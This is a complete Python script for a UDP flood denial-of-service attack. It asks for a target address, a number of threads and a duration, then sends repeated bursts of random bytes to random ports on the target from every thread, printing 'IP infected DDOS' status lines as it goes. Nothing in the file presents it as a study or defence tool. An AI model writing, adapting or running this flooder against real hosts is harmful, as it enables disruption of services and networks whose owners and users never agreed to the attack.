import socket, time, random, threading, sys, os

try:
    os.system ("cls")
    Target, Threads, Timer = str(sys.argv[1]), int(input('Threads (ej: 30): ')), float(input('Time in Seconds (example: 300): '))
except IndexError:
    print('\n[+] Usage: python ' + sys.argv[0] + ' <Target> <Threads> <Timer>')
try:
    nombrepc = socket.gethostbyaddr(str(sys.argv[1]))
except:
    nombrepc = ['other']
Timeout = time.time() + 1 * Timer
os.system ("cls")
def Attack():
    try:
        Bytes = random._urandom(1024)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < Timeout:
            dport = random.randint(22,55500)
            sock.sendto(Bytes*random.randint(30,31),(Target,dport))
           
            print('  - | IP infected DDOS |', str(sys.argv[1]),'| NamePC:', nombrepc[0], '| Thread:', Threads, '| Seconds:', Timer)     
        return
    except Exception as Error:
        print(Error)
for _ in range(0, Threads):
    threading.Thread(target=Attack).start()

